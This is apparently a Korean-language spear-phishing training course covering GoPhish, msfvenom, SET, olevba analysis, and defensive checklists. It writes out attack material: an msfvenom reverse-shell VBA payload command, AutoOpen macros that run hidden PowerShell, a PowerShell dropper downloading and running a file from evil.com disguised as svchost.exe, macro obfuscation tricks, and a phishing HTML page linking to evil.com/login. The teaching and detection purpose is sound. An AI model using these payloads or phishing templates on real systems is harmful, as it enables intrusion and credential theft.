#1. GoPhish 피싱 프레임워크 소개

GoPhish란?

GoPhish는 오픈소스 피싱 시뮬레이션 프레임워크입니다. 기업의 보안 담당자가 직원들의 피싱 대응 능력을 테스트하기 위해 사용합니다. 실제 공격자의 도구가 아니라 방어 훈련용 도구입니다.

GoPhish 핵심 구성요소

Sending Profiles

이메일을 보내는 SMTP 서버 설정. 발신자 주소, SMTP 호스트, 인증 정보를 등록합니다.

Email Templates

피싱 이메일의 제목, 본문, 첨부파일을 설계합니다. HTML 에디터로 실제 기업 메일처럼 꾸밉니다.

Landing Pages

수신자가 링크를 클릭하면 보이는 가짜 로그인 페이지. 자격 증명 입력을 유도합니다.

Campaigns

위 요소를 조합해 실제 캠페인을 실행. 누가 열었는지, 클릭했는지, 정보를 입력했는지 추적합니다.

# GoPhish 설치 및 실행 (교육 환경)
$ wget https://github.com/gophish/gophish/releases/latest
$ unzip gophish-v0.12.1-linux-64bit.zip
$ cd gophish && ./gophish
# 기본 관리 패널: https://127.0.0.1:3333
# 기본 계정: admin / (초기 비밀번호는 콘솔 출력에 표시)
⚠️ 법적 주의: GoPhish를 사용한 피싱 시뮬레이션은 반드시 조직의 서면 승인을 받은 후에만 수행해야 합니다. 무단 피싱 테스트는 형법에 저촉될 수 있습니다.

#2. msfvenom 페이로드 생성

msfvenom이란?

Metasploit Framework의 페이로드 생성기입니다. 공격자가 스피어피싱 첨부파일에 삽입할 악성 코드(페이로드)를 만들 때 사용합니다. 방어자는 이 도구의 작동 원리를 이해해야 탐지 규칙을 만들 수 있습니다.

핵심 개념: 페이로드 vs 익스플로잇

🔓

익스플로잇 (Exploit)

취약점을 이용해 문을 여는 "열쇠"

💣

페이로드 (Payload)

문이 열린 후 실행되는 "실제 공격 코드"

# 교육용 예시: VBA 매크로 페이로드 생성
$ msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f vba -o payload.vba
# 옵션 설명:
# -p : 페이로드 종류 (reverse_tcp = 피해자→공격자 역방향 연결)
# LHOST : 공격자 IP (수신 대기)
# LPORT : 공격자 포트
# -f vba : 출력 형식을 VBA 매크로로 지정

주요 페이로드 형식

형식 (-f) 용도 스피어피싱 활용
vba Office 매크로 .docm/.xlsm 문서에 삽입
hta-psh HTA + PowerShell .hta 파일로 첨부
exe 실행 파일 .iso 안에 은닉
psh PowerShell 스크립트 파일리스 공격

#3. SET (Social Engineering Toolkit)

SET 개요

SET는 소셜 엔지니어링 공격을 자동화하는 Python 기반 프레임워크입니다. 스피어피싱 이메일 발송, 악성 첨부파일 생성, 자격 증명 수집 페이지를 메뉴 방식으로 간편하게 설정할 수 있습니다.

# SET 메인 메뉴
$ sudo setoolkit
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
set> 1
1) Spear-Phishing Attack Vectors ← 스피어피싱
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
set> 1
1) Perform a Mass Email Attack
2) Create a FileFormat Payload ← 악성 첨부파일 생성
3) Create a Social-Engineering Template

SET의 스피어피싱 공격 흐름

SET 실행 → 페이로드 선택 → 이메일 템플릿 작성 → 타깃 이메일 입력 → 자동 발송

GoPhish vs SET 비교

항목 GoPhish SET
용도 보안 훈련/시뮬레이션 침투 테스트
UI 웹 대시보드 CLI 메뉴
추적 오픈률/클릭률 리포트 실시간 리스너

#4. olevba 매크로 분석 도구

olevba란?

oletools 패키지에 포함된 Python 도구로, Office 문서(.doc, .docm, .xls, .xlsm) 안의 VBA 매크로를 문서를 열지 않고도 안전하게 추출·분석할 수 있습니다.

# olevba 설치
$ pip install oletools
# 의심 문서 분석
$ olevba suspicious_invoice.docm
olevba 0.60.2 - analyzing suspicious_invoice.docm
----------------------------------------------
Type Keyword Description

Suspicious Shell 셸 명령 실행

Suspicious Environ 환경 변수 접근
IOC http://evil.com/payload.exe 외부 URL

olevba 분석 결과 읽는 법

AutoExec 문서를 열면 자동 실행되는 매크로 발견 → 높은 위험
Suspicious Shell, WScript, PowerShell 등 시스템 명령 호출 → 악성 행위 가능
IOC 외부 URL, IP 주소 등 침해 지표(Indicator of Compromise) 발견

#5. SMTP → MIME 인코딩 원리

이메일이 실제로 전송되는 과정

사용자가 "보내기"를 누르면 이메일 클라이언트는 SMTP 프로토콜을 사용해 메일 서버와 대화합니다. 첨부파일은 MIME 규격에 따라 Base64로 인코딩되어 텍스트 형태로 전송됩니다.

# 실제 SMTP 세션 (telnet으로 재현)
$ telnet mail.example.com 25
220 mail.example.com ESMTP ready
EHLO client.local
250-mail.example.com Hello
MAIL FROM:<sender@example.com>
250 OK
RCPT TO:<victim@target.com>
250 OK
DATA
354 Start mail input
Subject: 3월 청구서
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY123"
--BOUNDARY123
Content-Type: text/plain
첨부된 청구서를 확인해 주세요.
--BOUNDARY123
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="invoice.docm"
UEsDBBQAAAAIANpT5lg... ← Base64 인코딩된 악성 파일
--BOUNDARY123--
.

Base64 인코딩이란?

바이너리 파일(실행 파일, 이미지 등)을 텍스트 문자로 변환하는 방식입니다. SMTP가 텍스트만 전송할 수 있으므로, 첨부파일은 반드시 Base64로 인코딩됩니다.

# Python으로 Base64 인코딩/디코딩
import base64
encoded = base64.b64encode(b"malware.exe bytes")
decoded = base64.b64decode(encoded) # 원본 복원

#6. VBA 엔진 → AutoOpen() 실행 흐름

VBA 엔진의 실행 과정

사용자가 .docm 파일을 열고 "콘텐츠 사용"을 클릭하면, Office 애플리케이션 내부의 VBA 엔진이 매크로 코드를 로드하고 실행합니다.

실행 단계 상세

1

OLE 컨테이너 파싱

Office가 .docm 파일의 OLE 구조를 읽어 VBA 프로젝트 스트림을 찾습니다.

2

보안 경고 표시

"매크로가 사용 중지되었습니다" 경고 바가 표시됩니다. 여기서 사용자의 선택이 갈립니다.

3

"콘텐츠 사용" 클릭 → VBA 엔진 활성화

VBA 프로젝트가 메모리에 로드되고, AutoOpen/Document_Open 프로시저가 자동 호출됩니다.

4

Shell/WScript 실행

VBA 코드가 Shell() 또는 WScript.Shell을 통해 cmd.exe나 powershell.exe를 호출합니다.

' 전형적인 악성 AutoOpen 패턴 (분석용)
Sub AutoOpen()
  Dim cmd As String
  cmd = "powershell -nop -w hidden -enc " & _
      Sheet1.Cells(1, 1).Value ' 숨겨진 셀에서 인코딩된 명령 읽기
  Shell cmd, vbHide ' 창을 숨기고 실행
End Sub

#7. 첨부파일 실행 → C2 연결 흐름

C2(Command & Control)란?

악성코드가 설치된 후, 공격자의 서버와 통신하며 명령을 주고받는 채널입니다. 스피어피싱의 최종 목표는 이 C2 연결을 수립하는 것입니다.

전체 공격 흐름 (Kill Chain)

Stage 1
이메일 수신: 피해자가 스피어피싱 이메일을 받고 첨부파일을 엽니다.
Stage 2
매크로 실행: VBA AutoOpen이 PowerShell을 호출합니다.
Stage 3
드로퍼 실행: PowerShell이 외부 서버에서 추가 페이로드를 다운로드합니다.
Stage 4
C2 비콘: 페이로드가 주기적으로 C2 서버에 접속하며 명령을 대기합니다.
Stage 5
후속 공격: 자격증명 탈취, 횡적 이동, 데이터 유출 등을 수행합니다.
# Stage 3 드로퍼 예시 (PowerShell)
powershell -nop -w hidden -c "
  $c = New-Object Net.WebClient;
  $c.DownloadFile(
    'http://evil.com/stage2.exe',
    '$env:TEMP\svchost.exe'
  );
  Start-Process '$env:TEMP\svchost.exe'
"
# -nop : 프로파일 로드 건너뛰기
# -w hidden : 창 숨기기
# 정상 프로세스명(svchost)으로 위장

💡 방어자 관점: C2 통신 탐지 포인트

  • 비정상적인 DNS 쿼리 (DGA 도메인, 고빈도 조회)
  • 업무 시간 외 HTTPS 아웃바운드 트래픽
  • 알려지지 않은 IP로의 주기적 비콘 패턴
  • PowerShell의 비정상적 네트워크 활동

#8. VBA 매크로 코드 직접 작성

교육 목적의 VBA 매크로 분석

공격 매크로의 구조를 이해해야 탐지 규칙을 만들 수 있습니다. 아래는 교육용 예시로, 실제 악성 행위는 수행하지 않습니다.

' 교육용 VBA: 악성 매크로의 전형적 구조 분석
' ⚠️ 이 코드는 분석 학습용입니다
Sub AutoOpen()
  ' Step 1: 난독화된 명령어를 셀에서 읽기
  Dim payload As String
  payload = ActiveDocument.Variables("hidden_cmd")
  ' Step 2: Base64 디코딩
  Dim decoded As String
  decoded = DecodeBase64(payload)
  ' Step 3: 셸 실행 (창 숨김)
  Dim wsh As Object
  Set wsh = CreateObject("WScript.Shell")
  wsh.Run decoded, 0, False
  ' 0 = vbHide (창 숨기기)
End Sub

매크로 난독화 기법 유형

문자열 연결
"pow" & "ers" & "hell" → "powershell"을 분리하여 탐지 우회
Chr() 함수
Chr(112) & Chr(111) & Chr(119) → ASCII 코드로 문자열 조립
환경변수 활용
Environ("COMSPEC") → cmd.exe 경로를 직접 쓰지 않고 환경변수로 참조
⚠️ 윤리적 주의: 이 지식은 탐지 규칙 작성과 방어를 위한 것입니다. 실제 악성 매크로를 배포하는 것은 불법입니다.

#9. 피싱 이메일 HTML 구성 실습

피싱 이메일의 HTML 구조

공격자는 HTML 이메일을 사용해 정교한 피싱을 제작합니다. 실제 회사 로고, 서명, 링크를 복제하여 진짜처럼 보이게 만듭니다.

<!-- 교육용 피싱 이메일 HTML 구조 분석 -->
<html>
<body style="font-family: Arial; background: #f5f5f5; padding: 20px;">
  <div style="max-width: 600px; margin: auto; background: white;">
    <!-- 회사 로고 복제 -->
    <img src="https://evil.com/fake-logo.png" />
    <h2>긴급: 비밀번호 변경이 필요합니다</h2>
    <p>보안 정책에 따라 비밀번호를 변경해 주세요.</p>
    <!-- 실제 URL을 숨기는 하이퍼링크 -->
    <a href="https://evil.com/login"
      style="display:inline-block; background:#0066cc;
      color:white; padding:12px 24px; text-decoration:none;">
      비밀번호 변경하기
    </a>
    <!-- 가짜 서명 -->
    <p style="font-size:11px; color:#999;">
      IT보안팀 | 02-1234-5678 | security@myc0mpany.com
    </p>
  </div>
</body></html>

피싱 이메일 분석 체크리스트

1 발신 도메인과 서명의 도메인이 일치하는가?
2 링크의 실제 URL(href)과 표시 텍스트가 일치하는가?
3 이미지가 외부 URL에서 로드되는가? (추적 픽셀 가능성)
4 "긴급", "즉시", "계정 정지" 등 심리적 압박 키워드가 있는가?
5 이메일 헤더의 SPF/DKIM/DMARC 인증이 통과했는가?

#10. 종합 실습: GoPhish 캠페인 시뮬레이션

시나리오: 내부 보안 훈련 캠페인

여러분은 보안 담당자입니다. GoPhish를 사용해 직원 50명을 대상으로 피싱 시뮬레이션 캠페인을 설계해야 합니다. 아래 단계를 따라 캠페인을 계획해 보세요.

캠페인 설계 단계

Step 1: 타깃 리스트 준비

HR 부서에서 테스트 대상 직원 목록(이름, 이메일)을 받아 GoPhish에 등록합니다.

# CSV 형식
First Name,Last Name,Email
김영희,Kim,yhkim@company.com
이철수,Lee,cslee@company.com

Step 2: 이메일 템플릿 작성

실제 사내 메일처럼 보이는 HTML 템플릿을 제작합니다. {{.FirstName}} 변수로 개인화합니다.

Step 3: 랜딩 페이지 구성

실제 SSO 로그인 페이지를 복제한 랜딩 페이지를 만듭니다. 자격증명 입력 시 경고 페이지로 리디렉트합니다.

Step 4: 결과 분석

캠페인 완료 후 오픈률, 클릭률, 제출률을 분석합니다. 부서별/직급별 취약점을 파악합니다.
